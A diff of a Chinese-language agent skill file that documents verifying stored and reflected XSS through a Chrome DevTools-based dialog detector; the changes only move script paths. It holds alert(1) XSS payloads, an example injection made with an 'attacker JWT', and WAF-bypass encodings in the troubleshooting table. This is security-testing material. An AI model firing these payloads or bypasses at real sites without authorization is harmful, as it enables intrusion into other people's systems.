@@ -13,9 +13,11 @@ description: 当需要验证 XSS 是否在受害者浏览器中真实执行时�
 
 ## 工具路径
 
+脚本在本 skill 目录下，pi 会自动将 skill 目录挂载到工作路径。用 `read` 工具查看 `SKILL.md` 后，脚本路径为本 skill 目录下的 `scripts/` 子目录。
+
 ```
-tools/xss-verify/detect.py    ← 主工具（CDP dialog 检测器）
-tools/xss-verify/launch.sh    ← 启动 Chrome-SecTest（幂等，重复调用安全）
+scripts/detect.py          ← 主工具（CDP dialog 检测器）
+scripts/launch-chrome.sh   ← 启动 Chrome-SecTest（幂等，重复调用安全）
 ```
 
 依赖：`python3 + websocket-client`（已安装）
@@ -27,7 +29,7 @@ tools/xss-verify/launch.sh    ← 启动 Chrome-SecTest（幂等，重复调用�
 ### Step 1：确保 Chrome-SecTest 已运行
 
 ```bash
-bash tools/xss-verify/launch.sh
+bash scripts/launch-chrome.sh
 ```
 
 launch.sh 是幂等的——如果 Chrome-SecTest 已在运行，直接返回。多 worker 可以安全地各自调用。
@@ -40,7 +42,7 @@ curl -s http://localhost:9223/json/list | python3 -c "import json,sys; print(f'C
 ### Step 2：运行检测工具
 
 ```bash
-python3 tools/xss-verify/detect.py \
+python3 scripts/detect.py \
   "https://target.example.com/victim-page" \
   --timeout 8 \
   --cdp-port 9223
@@ -69,7 +71,7 @@ stderr 输出：过程日志（创建 tab、导航、关闭 tab）
 
 ```
 【注入】PATCH /api/v1/xxx (attacker JWT) body={"field":"<img src=x onerror=alert(1)>"} → HTTP 200
-【检测命令】python3 tools/xss-verify/detect.py "https://target/victim-page" --cdp-port 9223
+【检测命令】python3 scripts/detect.py "https://target/victim-page" --cdp-port 9223
 【检测结果】exit 0 — dialog_message='1' ← 与注入的 alert(1) 匹配，XSS 真实执行确认
 ```
 
@@ -92,7 +94,7 @@ stderr 输出：过程日志（创建 tab、导航、关闭 tab）
 
 3. **验证执行**：导航到受害者页面，检测 dialog
    ```bash
-   python3 tools/xss-verify/detect.py "https://target/profile" --cdp-port 9223 --timeout 10
+   python3 scripts/detect.py "https://target/profile" --cdp-port 9223 --timeout 10
    ```
 
 4. **判定**：exit 0 + dialog_message 与 payload 匹配 → XSS 确认
@@ -102,7 +104,7 @@ stderr 输出：过程日志（创建 tab、导航、关闭 tab）
 1. **构造 URL**：`https://target/search?q=<script>alert(1)</script>`
 2. **验证执行**：
    ```bash
-   python3 tools/xss-verify/detect.py "https://target/search?q=<script>alert(1)</script>" --cdp-port 9223
+   python3 scripts/detect.py "https://target/search?q=<script>alert(1)</script>" --cdp-port 9223
    ```
 
 ---
@@ -112,7 +114,7 @@ stderr 输出：过程日志（创建 tab、导航、关闭 tab）
 | 问题 | 解决 |
 |------|------|
 | dialog 未弹出 | 确认是前端页面 URL，不是 API endpoint；确认受害者视角能看到含 payload 的字段；增加 `--timeout 15` |
-| Chrome 未运行 | `bash tools/xss-verify/launch.sh` 启动 |
+| Chrome 未运行 | `bash scripts/launch-chrome.sh` 启动 |
 | `--tab-index` 冲突 | 不要用 `--tab-index`，默认创建新 tab 即可 |
 | 创建 tab 失败 | Chrome 可能 tab 数量过多，关闭一些不需要的 tab |
 | payload 被 WAF 拦截 | 尝试编码绕过：`\u003cscript\u003e`、`<scr<script>ipt>` 等 |
